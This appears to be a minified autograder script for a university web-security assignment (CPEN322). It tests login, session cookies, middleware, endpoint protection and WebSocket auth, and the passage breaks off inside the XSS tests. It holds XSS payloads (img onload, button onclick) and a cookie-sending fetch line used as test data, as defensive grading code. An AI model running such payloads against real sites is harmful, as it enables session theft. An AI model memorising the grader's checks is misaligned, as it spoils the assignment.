const __tester = {
    listeners: [],
    timers: [],
    exports: new Map,
    defaults: {
        testUser1: {
            username: "alice",
            password: "secret",
            saltedHash: "1htYvJoddV8mLxq3h7C26/RH2NPMeTDxHIxWn49M/G0wxqh/7Y3cM+kB1Wdjr4I="
        },
        testUser2: {
            username: "bob",
            password: "password",
            saltedHash: "MIYB5u3dFYipaBtCYd9fyhhanQkuW4RkoRTUDLYtwd/IjQvYBgMHL+eoZi3Rzhw="
        },
        testRoomId: "room-1",
        cookieName: "cpen322-session",
        image: "assets/everyone-icon.png",
        webSocketServer: "ws://localhost:8000"
    },
    oldAddEventListener: HTMLElement.prototype.addEventListener,
    newAddEventListener: function(e, t, ...s) {
        return __tester.listeners.push({
            node: this,
            type: e,
            listener: t,
            invoke: e => t.call(this, e)
        }), __tester.oldAddEventListener.call(this, e, t, ...s)
    },
    oldSetInterval: window.setInterval,
    newSetInterval: function(e, t, ...s) {
        return __tester.timers.push({
            type: "Interval",
            func: e,
            delay: t
        }), __tester.oldSetInterval.call(this, e, t, ...s)
    },
    export: (e, t) => {
        __tester.exports.has(e) || __tester.exports.set(e, {}), Object.assign(__tester.exports.get(e), t)
    },
    setDefault: (e, t) => {
        __tester.defaults[e] = t
    }
};
HTMLElement.prototype.addEventListener = __tester.newAddEventListener, WebSocket.prototype.addEventListener = __tester.newAddEventListener, window.setInterval = __tester.newSetInterval, window.cpen322 = {
    export: __tester.export,
    setDefault: __tester.setDefault
}, window.addEventListener("load", () => {
    const e = window.fetch,
        t = (t, s) => e(t, s).then(e => 200 === e.status ? e.text().then(e => e ? JSON.parse(e) : e) : e.text().then(e => Promise.reject(new Error(e)))),
        s = e => e[Math.floor(e.length * Math.random())],
        o = (e, ...s) => t("cpen322/a5", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                func: e,
                args: s
            })
        }),
        n = (e, ...s) => t("cpen322/a5/express", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                func: e,
                args: s
            })
        });
    let r = null;
    const i = () => r = document.cookie,
        a = async () => {
            document.cookie = document.cookie + "; expires=" + (new Date).toUTCString(), await y(50)
        }, c = async () => {
            await a(), document.cookie = r
        }, l = (e, t) => {
            if (void 0 === e) return void 0 === t;
            if (null === e) return null === t;
            let s = Object.getPrototypeOf(e);
            if (s === Object.getPrototypeOf(t)) {
                if (s === Boolean.prototype || s === Number.prototype || s === String.prototype) return e === t;
                if (s === Array.prototype) return e.length === t.length && e.reduce((e, s, o) => e && l(s, t[o]), !0); {
                    let s = Object.keys(e).sort();
                    return l(s, Object.keys(t).sort()) && s.reduce((s, o, n) => s && l(e[o], t[o]), !0)
                }
            }
            return !1
        }, d = () => Math.random() < .5 ? __tester.defaults.testUser1 : __tester.defaults.testUser2, u = e => (e => {
            let t = Array.from(e).reduce((e, t) => (e[t] || (e[t] = 0), e[t]++, e), {});
            return -1 * Object.keys(t).reduce((s, o) => s + t[o] / e.length * Math.log(t[o] / e.length) / Math.log(2), 0)
        })(e) * e.length, m = e => btoa(crypto.getRandomValues(new Uint8Array(e)).reduce((e, t) => e + String.fromCharCode(t), "")), g = async e => crypto.subtle.digest("SHA-256", new TextEncoder("utf-8").encode(e)).then(e => (e => btoa(new Uint8Array(e).reduce((e, t) => e + String.fromCharCode(t), "")))(e)), h = () => {
            let e = {};
            return e.promise = new Promise((t, s) => {
                e.resolve = t, e.reject = s
            }), e
        }, p = e => {
            let t = document.createElement("template");
            return t.innerHTML = e.trim(), t.content.firstChild
        }, w = [{
            id: "1",
            description: "Login Page HTML",
            maxScore: 2,
            run: async () => {
                let t = {
                        id: 1,
                        score: 0,
                        comments: []
                    },
                    s = null;
                if (k("(Client) Checking if the login page has a form element"), "/login" === window.location.pathname || "/login.html" === window.location.pathname) s = document.querySelector("form");
                else {
                    let o = await e("/login.html").then(e => e.text());
                    if (o) {
                        let e = document.createElement("template");
                        e.innerHTML = o.trim(), s = e.content.querySelector("form")
                    } else t.comments.push(x('Could not fetch "/login.html" from the server'))
                }
                if (s) {
                    v("Found a form element"), k('(Client) Checking form "method" attribute'), s.attributes.method && "POST" === s.attributes.method.value ? (t.score += .25, v('"method" set to "POST"')) : t.comments.push(x('form should have the "method" attribute set to "POST"')), k('(Client) Checking form "action" attribute'), s.attributes.action && "/login" === s.attributes.action.value ? (t.score += .25, v('"action" set to "/login"')) : t.comments.push(x('form should have the "action" attribute set to "/login"')), k("(Client) Checking if form element contains username input"), s.querySelector("input[type=text][name=username]") ? (t.score += .5, v("Found username input")) : t.comments.push(x('form should contain a text input element with "name" attribute set to "username"')), k("(Client) Checking if form element contains password input"), s.querySelector("input[type=password][name=password]") ? (t.score += .5, v("Found password input")) : t.comments.push(x('form should contain a password input element with "name" attribute set to "password"')), k("(Client) Checking if form element contains a submit input or button");
                    let e = s.querySelector("input[type=submit],button[type=submit]");
                    e ? (t.score += .5, v("Found submit " + e.tagName.toLowerCase())) : t.comments.push(x("form should contain a submit input element or a submit button"))
                } else t.comments.push(x("Could not find a form element"));
                return t
            }
        }, {
            id: "2",
            description: "User Database",
            maxScore: 1,
            run: async () => {
                let e = {
                        id: 2,
                        score: 0,
                        comments: []
                    },
                    t = d();
                try {
                    k('(Server) Checking "Database.prototype.getUser" implementation (by calling "db.getUser")');
                    let s = await o("callObjectByString", "db.getUser", t.username);
                    e.score += .5, s.username && s.username === t.username ? s.password || s.username !== t.saltedHash ? (e.score += .5, v("The object has the right property values")) : e.comments.push(x('The object returned by "db.getUser" does not have the expected "password"', "Expected: " + t.saltedHash, "Got: " + s.password)) : e.comments.push(x('The object returned by "db.getUser" does not have the expected "username"', "Expected: " + t.username, "Got: " + s.username))
                } catch (t) {
                    t.message.indexOf("timed out") > -1 ? e.comments.push(x('"db.getUser" did not resolve to anything (test timed out after waiting for 5 seconds)')) : e.comments.push(x('Error upon calling "db.getUser" in server.js: ' + t.message))
                }
                return e
            }
        }, {
            id: "3",
            description: "Session Creation",
            maxScore: 5,
            run: async () => {
                let t = {
                        id: 3,
                        score: 0,
                        comments: []
                    },
                    s = d();
                try {
                    k('(Server) Trying to access "sessionManager" in server.js');
                    let r = await o("getGlobalObject", "sessionManager");
                    if (r) {
                        if (v('Found "sessionManager"'), k('(Server) Checking if "sessionManager" is a SessionManager instance'), await o("checkObjectType", "sessionManager", "./SessionManager.js/")) {
                            t.score += .25, v('"sessionManager" is a SessionManager instance'), i(), await a(), k('(Server) Checking "createSession" implementation');
                            let r = (await n("testCreateSession", s.username, 2e3)).split("; ").reduce((e, t) => {
                                    let s = t.indexOf("=");
                                    return e[t.substring(0, s)] = t.substring(s + 1), e
                                }, {}),
                                l = (e => [e.substring(0, e.indexOf("=")), e.substring(e.indexOf("=") + 1)])(document.cookie);
                            if (k('(Server) Checking if "createSession" sets the cookie name correctly'), l[0] && l[0] === __tester.defaults.cookieName ? (t.score += .25, v('"sessionManager.createSession" sets cookie name "' + __tester.defaults.cookieName + '"')) : t.comments.push(x('"sessionManager.createSession" does not set cookie name to "' + __tester.defaults.cookieName + '"')), k('(Server) Checking if "createSession" sets the cookie value correctly'), l[1]) {
                                let n = u(l[1]);
                                if (n < 88) t.comments.push(x('The cookie value set by "sessionManager.createSession" is too weak (needs at least 88). Current strength = ' + n, "\n\tStrength formula = Number_of_Chars(value) * Shannon_Entropy(value)", "\n\thttp://bearcave.com/misl/misl_tech/wavelets/compression/shannon.html"));
                                else {
                                    t.score += .5, v('"sessionManager.createSession" sets a strong enough cookie value (strength = ' + Math.round(100 * n) / 100 + ")"), k("(Server) Checking if Max-Age was set"), r["Max-Age"] && "2" === r["Max-Age"] ? (t.score += .5, v('"sessionManager.createSession" sets Max-Age attribute')) : t.comments.push(x('"sessionManager.createSession" does not set Max-Age attribute on the cookie to the given maxAge argument. Expected Max-Age = 2, but got ' + String(r["Max-Age"]))), k("(Server) Checking if " + l[1] + " is a valid session");
                                    let i = await o("callObjectByString", "sessionManager.getUsername", l[1]);
                                    i && i === s.username ? (t.score += .25, v('"sessionManager.createSession" creates a new session'), k("(Server) Waiting for 3 seconds for session to expire"), await y(3e3), k("(Server) Checking if " + l[1] + " is a valid session"), i = await o("callObjectByString", "sessionManager.getUsername", l[1]), console.log(i), null !== i ? t.comments.push(x("sessionManager is not deleting the session in the server after the cookie expired")) : (t.score += .5, v("Session data deleted in the server after cookie expired"))) : t.comments.push(x('Could not find a valid session after "createSession" was called')), await c();
                                    let a = Array.from({
                                            length: 5
                                        }, e => {
                                            let t = m(9);
                                            return {
                                                pw: t,
                                                hash: t,
                                                result: !1
                                            }
                                        }),
                                        d = Array.from({
                                            length: 5
                                        }, e => {
                                            let t = m(9);
                                            return {
                                                pw: t,
                                                hash: t + m(15),
                                                result: !1
                                            }
                                        }),
                                        u = Array.from({
                                            length: 5
                                        }, e => ({
                                            pw: m(9)
                                        }));
                                    await T.call(u, async e => {
                                        m(15);
                                        let t = await g(e.pw);
                                        e.hash = t, e.result = !1
                                    });
                                    let h = Array.from({
                                        length: 5
                                    }, e => ({
                                        pw: m(9)
                                    }));
                                    await T.call(h, async e => {
                                        let t = m(15),
                                            s = await g(e.pw);
                                        e.hash = t + s, e.result = !1
                                    });
                                    let p = Array.from({
                                        length: 5
                                    }, e => ({
                                        pw: m(9)
                                    }));
                                    await T.call(p, async e => {
                                        let t = m(15),
                                            s = await g(e.pw + t);
                                        e.hash = s, e.result = !1
                                    });
                                    let w = Array.from({
                                        length: 5
                                    }, e => ({
                                        pw: m(9)
                                    }));
                                    await T.call(w, async e => {
                                        let t = m(15),
                                            s = await g(e.pw + t);
                                        e.hash = t + s, e.result = !0
                                    });
                                    let S = w.concat(a, d, u, h, p),
                                        f = (S = (e => {
                                            let t = e.slice();
                                            for (let e = t.length - 1; e > 0; e--) {
                                                const s = Math.floor(Math.random() * (e + 1));
                                                [t[e], t[s]] = [t[s], t[e]]
                                            }
                                            return t
                                        })(S)).map(e => ["isCorrectPassword", e.pw, e.hash]);
                                    k('(Server) Checking if "isCorrectPassword" works');
                                    let b = await o("callLines", f),
                                        C = S.reduce((e, t, s) => (e.result = e.result && t.result === b[s], t.result !== b[s] && e.comments.push(`Expected isCorrectPassword("${t.pw}", "${t.hash}") to be ${t.result}, but got ${b[s]}`), e), {
                                            result: !0,
                                            comments: []
                                        });
                                    !0 !== C.result ? C.comments.forEach(e => {
                                        t.comments.push(x(e))
                                    }) : (t.score += 1, v('"isCorrectPassword" works as expected'));
                                    let E = document.cookie;
                                    try {
                                        k("(Server) Checking POST /login handler");
                                        let n = await e("/login", {
                                            method: "POST",
                                            headers: {
                                                "Content-Type": "application/x-www-form-urlencoded"
                                            },
                                            body: `username=${s.username}&password=${s.password}`
                                        });
                                        if (k('(Server) Checking if POST /login handler redirects to "/" upon successful log in'), 200 === n.status && n.redirected && n.url === window.location.origin + "/") {
                                            t.score += .5, v('POST "/login" returns via redirection to "/"'), k("(Server) Checking if POST /login handler sets a new cookie");
                                            let e = document.cookie;
                                            e === E ? t.comments.push(x('POST "/login" should set a new cookie upon successful log in')) : (t.score += .5, v('POST "/login" sets a new cookie upon log in'));
                                            let n = e.substring(e.indexOf("=") + 1);
                                            k("(Server) Checking if " + n + " is a valid session");
                                            let r = await o("callObjectByString", "sessionManager.getUsername", n);
                                            r && r === s.username ? (t.score += .25, v('POST "/login" creates a new session')) : t.comments.push(x("Could not find a valid session after a successful log in"))
                                        } else t.comments.push(x('POST "/login" should eventually redirect to "/" when given the right username and password'));
                                        k("(Server) Checking POST /login handler error handling (user does not exist)");
                                        let r = await e("/login", {
                                            method: "POST",
                                            headers: {
                                                "Content-Type": "application/x-www-form-urlencoded"
                                            },
                                            body: `username=${Math.random().toString(16).substr(2)}&password=${Math.random().toString(16).substr(2)}`
                                        });
                                        200 === r.status && r.redirected && r.url === window.location.origin + "/login" ? (t.score += .25, v('POST "/login" redirects to login page when user does not exist')) : t.comments.push(x("Was expecting POST /login to redirect to login page when the user does not exist")), k("(Server) Checking POST /login handler error handling (incorrect password)");
                                        let i = await e("/login", {
                                            method: "POST",
                                            headers: {
                                                "Content-Type": "application/x-www-form-urlencoded"
                                            },
                                            body: `username=${s.username}&password=${Math.random().toString(16).substr(2)}`
                                        });
                                        200 === i.status && i.redirected && i.url === window.location.origin + "/login" ? (t.score += .25, v('POST "/login" redirects to login page when password is incorrect')) : t.comments.push(x("Was expecting POST /login to redirect to login page when the password is incorrect"))
                                    } catch (e) {
                                        t.comments.push(x("Unexpected Error while testing POST /login: " + e.message, e))
                                    } finally {
                                        document.cookie = document.cookie + "; expires=" + (new Date).toUTCString(), await y(50), document.cookie = E
                                    }
                                }
                            } else t.comments.push(x('"sessionManager.createSession" does not set cookie value'))
                        } else t.comments.push(x('"sessionManager" object is not a "SessionManager" instance'))
                    } else t.comments.push(x('Found "sessionManager" but it is = ' + String(r)))
                } catch (e) {
                    e.message.indexOf("timed out") > -1 ? t.comments.push(x('Timed out while trying to access "sessionManager"')) : t.comments.push(x(e.message))
                }
                return t
            }
        }, {
            id: "4.1",
            description: "Session Middleware",
            maxScore: 4,
            run: async () => {
                let t = {
                        id: 4.1,
                        score: 0,
                        comments: []
                    },
                    s = document.cookie;
                (await o("checkRequire", "cookie-parser")).error ? t.score += .25 : t.comments.push(x('"cookie-parser" module being used')), k('(Server) Checking "middleware" implementation: no Cookie header set'), await a();
                let r = await n("testMiddleware");
                r.nextArg && "SessionError" === r.nextArg.type ? (t.score += 1, v('"middleware" calls "next" with a "SessionError" object')) : t.comments.push(x('"middleware" should be calling "next" with a new "SessionError" object if the request has no cookie')), k('(Server) Checking "middleware" implementation: Cookie with invalid session token'), document.cookie = __tester.defaults.cookieName + "=" + Math.random().toString(16).substr(2), (r = await n("testMiddleware")).nextArg && "SessionError" === r.nextArg.type ? (t.score += 1, v('"middleware" calls "next" with a "SessionError" object')) : t.comments.push(x('"middleware" should be calling "next" with a new "SessionError" object if the cookie value is not valid')), k('(Server) Checking "middleware" implementation: Cookie with valid session token');
                let i = d(),
                    c = (await n("signInTestUser", i.username), document.cookie.substring(document.cookie.indexOf("=") + 1));
                (r = await n("testMiddleware")).session && r.session === c ? r.username && r.username === i.username ? r.nextArg ? t.comments.push(x('"middleware" should be calling "next" with no arguments')) : (t.score += .5, v('"middleware" attaches "session" and "username" properties to the request, and calls "next" with no arguments')) : t.comments.push(x('"middleware" should be assigning the associated username to the "username" property of the Request object passed to the middleware. Found = ' + String(r.username))) : t.comments.push(x('"middleware" should be assigning the session token to the "session" property of the Request object passed to the middleware. Found = ' + String(r.session))), k('(Server) Checking "middleware" implementation: cookie parsing given multiple cookies');
                let l = Math.random().toString(16).substr(2),
                    u = Math.random().toString(16).substr(2),
                    m = Math.random().toString(16).substr(2),
                    g = Math.random().toString(16).substr(2);
                document.cookie = l + "=" + u, document.cookie = m + "=" + g, (r = await n("testMiddleware")).nextArg && "SessionError" === r.nextArg.type ? t.comments.push(x('"middleware" throws SessionError when multiple cookies are set, even though legitimate session cookie is included')) : r.session && r.session === c ? r.username && r.username === i.username ? r.nextArg ? t.comments.push(x('"middleware" should be calling "next" with no arguments')) : (t.score += .5, v('"middleware" attaches "session" and "username" properties to the request, and calls "next" with no arguments')) : t.comments.push(x('"middleware" should be assigning the associated username to the "username" property of the Request object passed to the middleware. Found = ' + String(r.username))) : t.comments.push(x('"middleware" should be assigning the session token to the "session" property of the Request object passed to the middleware. Found = ' + String(r.session))), document.cookie = l + "=" + u + "; expires=" + (new Date).toUTCString(), document.cookie = m + "=" + g + "; expires=" + (new Date).toUTCString(), await a(), k("(Server) Checking custom error handler"), k('(Server) throwing SessionError from one of the handlers, with "Accept" header set to "application/json"');
                let h = await e("cpen322/a5/middleware", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        Accept: "application/json"
                    },
                    body: JSON.stringify({
                        func: "throwSessionError",
                        args: []
                    })
                });
                return 401 !== h.status ? t.comments.push(x('Custom error handler does not return HTTP 401 when "SessionError" is thrown from one of the request handlers and the "Accept" header is "application/json"', "\nResponse = ", h)) : (t.score += .25, v('Custom error handler returns HTTP 401 when "SessionError" is thrown from one of the request handlers and the "Accept" header is "application/json"')), k('(Server) throwing SessionError from one of the handlers, with "Accept" header not set to "application/json"'), 200 === (h = await e("cpen322/a5/middleware", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        func: "throwSessionError",
                        args: []
                    })
                })).status && h.redirected && h.url === window.location.origin + "/login" ? (t.score += .25, v('Custom error handler returns HTTP 200 via redirect to /login when "SessionError" is thrown from one of the request handlers and the "Accept" header is not "application/json"')) : t.comments.push(x('Custom error handler does not redirect to /login when "SessionError" is thrown from one of the request handlers and the "Accept" header is not "application/json"', "\nResponse = ", h)), k("(Server) throwing arbitrary Error from one of the handlers"), 500 !== (h = await e("cpen322/a5/middleware", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        Accept: "application/json"
                    },
                    body: JSON.stringify({
                        func: "throwError",
                        args: []
                    })
                })).status ? t.comments.push(x('Custom error handler does not return HTTP 500 when other "Error" is thrown from one of the request handlers', "\nResponse = ", h)) : (t.score += .25, v('Custom error handler returns HTTP 500 when other "Error" is thrown from one of the request handlers')), document.cookie = s, t
            }
        }, {
            id: "4.2",
            description: "Resource Endpoint Protection",
            maxScore: 3,
            run: async () => {
                let t = {
                        id: 4.2,
                        score: 0,
                        comments: []
                    },
                    s = [
                        ["GET", "/chat/" + __tester.defaults.testRoomId + "/messages", 401, "/login", 200],
                        ["GET", "/chat/" + __tester.defaults.testRoomId, 401, "/login", 200],
                        ["GET", "/chat", 401, "/login", 200],
                        ["GET", "/profile", 401, "/login", 200],
                        ["GET", "/app.js", 401, "/login", 200],
                        ["GET", "/index.html", 401, "/login", 200],
                        ["GET", "/index", 401, "/login", 200],
                        ["GET", "/", 401, "/login", 200],
                        ["POST", "/chat", 401, "/login", 400]
                    ],
                    o = document.cookie;
                document.cookie = __tester.defaults.cookieName + "=" + Math.random().toString(16).substr(2), k("Testing all the endpoints, Signed-in = FALSE, Accept = application/json"), await T.call(s, async s => {
                    let [o, n, r] = s;
                    if ("GET" === o) {
                        let s = await e(n, {
                            headers: {
                                Accept: "application/json"
                            }
                        });
                        s.status !== r ? t.comments.push(x("Expected " + o + ' "' + n + '" to return status ' + r + ", but it returned " + s.status, "\nResponse = ", s)) : (t.score += .1, v(o + ' "' + n + '" returns status ' + s.status + " as expected"))
                    } else if ("POST" === o) {
                        let s = await e(n, {
                            method: o,
                            headers: {
                                "Content-Type": "application/json",
                                Accept: "application/json"
                            },
                            body: JSON.stringify({})
                        });
                        s.status !== r ? t.comments.push(x("Expected " + o + ' "' + n + '" to return status ' + r + ", but it returned " + s.status, "\nResponse = ", s)) : (t.score += .1, v(o + ' "' + n + '" returns status ' + r + " as expected"))
                    }
                });
                let r = await e("/login", {
                    headers: {
                        Accept: "application/json"
                    }
                });
                200 !== r.status || r.redirected || r.url !== window.location.origin + "/login" ? t.comments.push(x('Expected GET "/login" to return status 200, but it returned ' + r.status, "\nResponse = ", r)) : (t.score += .1, v('GET "/login" returns status ' + r.status + " as expected")), console.log("\n\n"), k("Testing all the endpoints, Signed-in = FALSE, Accept = ANY"), await T.call(s, async s => {
                    let [o, n, r, i] = s;
                    if ("GET" === o) {
                        let s = await e(n);
                        200 === s.status && s.redirected && s.url === window.location.origin + i ? (t.score += .1, v(o + ' "' + n + '" returns status ' + s.status + " as expected")) : t.comments.push(x("Expected " + o + ' "' + n + '" to be redirected to ' + i + ", but server returned " + s.status, "\nResponse = ", s))
                    } else if ("POST" === o) {
                        let s = await e(n, {
                            method: o,
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({})
                        });
                        200 === s.status && s.redirected && s.url === window.location.origin + i ? (t.score += .1, v(o + ' "' + n + '" returns status ' + r + " as expected")) : t.comments.push(x("Expected " + o + ' "' + n + '" to be redirected to ' + i + ", but server returned " + s.status, "\nResponse = ", s))
                    }
                }), 200 !== (r = await e("/login")).status || r.redirected || r.url !== window.location.origin + "/login" ? t.comments.push(x('Expected GET "/login" to return status 200, but it returned ' + r.status, "\nResponse = ", r)) : (t.score += .1, v('GET "/login" returns status ' + r.status + " as expected"));
                let i = d();
                await n("signInTestUser", i.username);
                return console.log("\n\n"), k("Testing all the endpoints, Signed-in = TRUE, Accept = ANY"), await T.call(s, async s => {
                    let [o, n, r, i, a] = s;
                    if ("GET" === o) {
                        let s = await e(n);
                        s.status !== a || s.redirected ? t.comments.push(x("Expected " + o + ' "' + n + '" to return ' + a + " directly, but server returned " + s.status + " via redirection to " + s.url, "\nResponse = ", s)) : (t.score += .1, v(o + ' "' + n + '" returns status ' + s.status + " as expected"))
                    } else if ("POST" === o) {
                        let s = await e(n, {
                            method: o,
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({})
                        });
                        s.status !== a || s.redirected ? t.comments.push(x("Expected " + o + ' "' + n + '" to return ' + a + ", but server returned " + s.status, "\nResponse = ", s)) : (t.score += .1, v(o + ' "' + n + '" returns status ' + a + " as expected"))
                    }
                }), 200 !== (r = await e("/login")).status || r.redirected || r.url !== window.location.origin + "/login" ? t.comments.push(x('Expected GET "/login" to return status 200, but it returned ' + r.status, "\nResponse = ", r)) : (t.score += .1, v('GET "/login" returns status ' + r.status + " as expected")), await a(), document.cookie = o, t.score = Math.round(100 * t.score) / 100, t
            }
        }, {
            id: "5",
            description: "WebSocket protection",
            maxScore: 2,
            run: async () => {
                let e = {
                    id: 6,
                    score: 0,
                    comments: []
                };
                i(), await a(), k("Testing WebSocket connection, Signed-in = FALSE");
                let t = new WebSocket(__tester.defaults.webSocketServer);
                await y(100), t.readyState !== WebSocket.CLOSED ? e.comments.push(x("Server should close WebSocket if it connects from an invalid session")) : (e.score += .5, v("Server closed WebSocket connection")), t.close(), document.cookie = __tester.defaults.cookieName + "=" + Math.random().toString(16).substr(2), k("Testing WebSocket connection, with invalid cookie"), t = new WebSocket(__tester.defaults.webSocketServer), await y(100), t.readyState !== WebSocket.CLOSED ? e.comments.push(x("Server should close WebSocket if it connects from an invalid session")) : (e.score += .5, v("Server closed WebSocket connection")), t.close();
                let s = d();
                await n("signInTestUser", s.username);
                if (k("Testing WebSocket connection, Signed-in = TRUE"), t = new WebSocket(__tester.defaults.webSocketServer), await y(100), t.readyState !== WebSocket.OPEN) e.comments.push(x("Server should accept WebSocket if it connects from a valid session"));
                else {
                    e.score += .5, v("Server accepted WebSocket connection");
                    let o = h();
                    new WebSocket(__tester.defaults.webSocketServer).addEventListener("message", e => {
                        o.resolve(JSON.parse(e.data))
                    }), await y(100), k('Checking if "username" is overwritten by the broker');
                    let n = Math.random().toString(16).substr(2);
                    t.send(JSON.stringify({
                        roomId: __tester.defaults.testRoomId,
                        username: n,
                        text: "Hello"
                    }));
                    let r = await o.promise;
                    r && r.username === s.username ? (e.score += .5, v('"username" in the message was set by the broker')) : e.comments.push(x('broker should provide "username" based on the session, and ignore any "username" sent by the client'))
                }
                return t.close(), await c(), e
            }
        }, {
            id: "6",
            description: "User Profile",
            maxScore: 2,
            run: async () => {
                let s = {
                        id: 6,
                        score: 0,
                        comments: []
                    },
                    r = i(),
                    u = r.substring(r.indexOf("=") + 1),
                    m = await o("callObjectByString", "sessionManager.getUsername", u);
                if (null === m) s.comments.push(x("Could not find the current user using the cookie " + u));
                else {
                    await a(), k("(Client) Making a GET request to /profile without signing in");
                    let o = await e("/profile");
                    200 === o.status && o.redirected && o.url === window.location.origin + "/login" ? (s.score += .5, v("GET /profile redirects to /login if user is not signed in")) : s.comments.push(x("GET /profile should redirect to /login if user is not signed in", "\nResponse = ", o)), k("(Client) Making a GET request to /profile as signed in user");
                    let r = d(),
                        i = (await n("signInTestUser", r.username), await t("/profile"));
                    if (i && i.username === r.username)
                        if (s.score += .5, v("GET /profile returned an object containing the username of the signed in user"), "/login" === window.location.pathname || "/login.html" === window.location.pathname) s.comments.push(x("Cannot run the rest of this test in Login Page"));
                        else if (k("(Client) Checking Service.getProfile implementation"), Service.getProfile && Service.getProfile instanceof Function) {
                        let e = await Service.getProfile();
                        l(i, e) ? (s.score += .5, v('"Service.getProfile" returns the same object as GET /profile'), k('(Client) Checking if "profile" was initialized'), await n("signInTestUser", m), i = await Service.getProfile(), profile.username !== i.username || profile.username !== m ? s.comments.push(x('The global "profile" object should be updated after calling Service.getProfile in "main"', profile.username, i.username, m)) : (s.score += .5, v('The global "profile" object has the same "username" as the object returned by "Service.getProfile"'))) : s.comments.push(x('Object returned by "Service.getProfile" is not equivalent to the object returned by GET /profile'))
                    } else s.comments.push(x('"Service.getProfile" should be a function'));
                    else s.comments.push(x("GET /profile should return an object with the 'username' of the signed in user"))
                }
                return await c(), s
            }
        }, {
            id: "7",
            description: "Session Deletion",
            maxScore: 2,
            run: async () => {
                let s = {
                    id: 7,
                    score: 0,
                    comments: []
                };
                i(), k('(Server) Checking "deleteSession" implementation'), k("(Server) Creating a test session to delete");
                let r = d(),
                    a = await n("signInTestUser", r.username),
                    l = document.cookie.substring(document.cookie.indexOf("=") + 1);
                if (a) {
                    let e = await n("testDeleteSession", {
                        username: r.username,
                        session: l
                    });
                    k('(Server) Checking if "username" property was removed from the Request object'), e.request.username ? s.comments.push(x('"sessionManager.deleteSession" does not delete the "username" property attached on the Express Request')) : (s.score += .5, v('"sessionManager.deleteSession" deletes the "username" property of the Request)')), k('(Server) Checking if "session" property was removed from the Request object'), e.request.session ? s.comments.push(x('"sessionManager.deleteSession" does not delete the "session" property attached on the Express Request')) : (s.score += .5, v('"sessionManager.deleteSession" deletes the "session" property of the Request)')), k('(Server) Checking if the corresponding session object was removed from "sessions"'), null !== await o("callObjectByString", "sessionManager.getUsername", l) ? s.comments.push(x('"sessionManager.deleteSession" does not delete the corresponding session object from "sessions"')) : (s.score += .5, v('"sessionManager.deleteSession" deletes the session object)'))
                } else s.comments.push(x("Failed to create a test session"));
                k("(Server) Checking GET /logout endpoint"), r = d(), a = await n("signInTestUser", r.username), l = document.cookie.substring(document.cookie.indexOf("=") + 1);
                let u = await t("/profile");
                if (u && u.username === r.username) {
                    let t = await e("/logout");
                    if (200 === t.status && t.redirected && t.url === window.location.origin + "/login") {
                        s.score += .25, v("GET /logout redirects to /login");
                        await e("/profile");
                        200 !== t.status || t.redirected ? (s.score += .25, v("GET /logout invalidated the session")) : s.comments.push(x("GET /profile should not be accessible after signing out"))
                    } else s.comments.push(x("GET /logout should redirect to /login"))
                } else s.comments.push(x("Could not get a valid response from GET /profile as a signed in user"));
                return await c(), s
            }
        }, {
            id: "8",
            description: "Defense against XSS attack",
            maxScore: 3,
            run: async () => {
                let e = {
                        id: 8,
                        score: 0,
                        comments: []
                    },
                    t = document.cookie,
                    n = window.location.hash;
                if ("/login" === window.location.pathname || "/login.html" === window.location.pathname) e.comments.push(x("Cannot run this test in Login Page"));
                else {
                    let t = __tester.exports.get(main);
                    if (t)
                        if (t.lobby)
                            if (t.chatView) {
                                let n = t.lobby,
                                    r = t.chatView,
                                    i = Object.values(n.rooms)[0];
                                k("(Client) navigating to a chat view to test XSS attacks"), window.location.hash = "#/chat/" + i.id, k("(Client) Mounting XSS attack via addMessage, using an img tag");
                                let a = d(),
                                    c = new Promise((e, t) => {
                                        cpen322.xssTarget = t, setTimeout(() => e(!0), 100)
                                    });
                                c.finally(() => {
                                    delete cpen322.xssTarget
                                }), i.addMessage(a.username, '<img src="assets/everyone-icon.png" style="display: none;" onload="cpen322.xssTarget(new Error(\'Invoked code via XSS\'))">');
                                try {
                                    await c, v("Attack failed - app is resilient to XSS attack 1A (via addMessage)"), e.score += .25
                                } catch (t) {
                                    e.comments.push(x("Attacked successfully - app is still vulnerable to XSS attack 1A (via addMessage)"))
                                }
                                k("(Client) Mounting XSS attack via addMessage, using a button tag"), a = d(), (c = new Promise((e, t) => {
                                    cpen322.xssTarget = t, setTimeout(() => e(!0), 100)
                                })).finally(() => {
                                    delete cpen322.xssTarget
                                });
                                let l = "attack-" + Math.random().toString().substring(4);
                                i.addMessage(a.username, `<button id="${l}" onclick="cpen322.xssTarget(new Error('Invoked code via XSS'))">Click Me</button>`);
                                let u = document.querySelector("#" + l);
                                u && u.click();
                                try {
                                    await c, v("Attack failed - app is resilient to XSS attack 1B (via addMessage)"), e.score += .25
                                } catch (t) {
                                    e.comments.push(x("Attacked successfully - app is still vulnerable to XSS attack 1B (via addMessage)"))
                                }
                                k("(Client) Passing a benign payload to addMessage");
                                let m = 'alert("This is a benign payload")';
                                a = d(), i.addMessage(a.username, m);
                                let g = Array.from(r.chatElem.querySelectorAll(".message")),
                                    w = g[g.length - 1].querySelector(".message-text");
                                w.textContent.indexOf(m) < 0 ? e.comments.push(x("Sanitization policy seems too strong, benign text should be displayed", "Text sent: " + m)) : (e.score += .2, v("Users can still write text that looks like code")), k("(Client) Passing a benign payload to addMessage"), m = 'fetch("http://localhost:8080?text=" + document.cookie)', a = d(), i.addMessage(a.username, m), (w = (g = Array.from(r.chatElem.querySelectorAll(".message")))[g.length - 1].querySelector(".message-text")).textContent.indexOf(m) < 0 ? e.comments.push(x("Sanitization policy seems too strong, benign text should be displayed", "Text sent: " + m)) : (e.score += .2, v("Users can still write text that looks like code")), k("(Client) Mounting XSS attack via onNewMessage, using an img tag"), a = d(), (c = new Promise((e, t) => {
                                    cpen322.xssTarget = t, setTimeout(() => e(!0), 100)
                                })).finally(() => {
                                    delete cpen322.xssTarget
                                }), i.onNewMessage({
                                    username: a.username,
                                    text: '<img src="assets/everyone-icon.png" style="display: none;" onload="cpen322.xssTarget(new Error(\'Invoked code via XSS\'))">'
                                });
                                try {
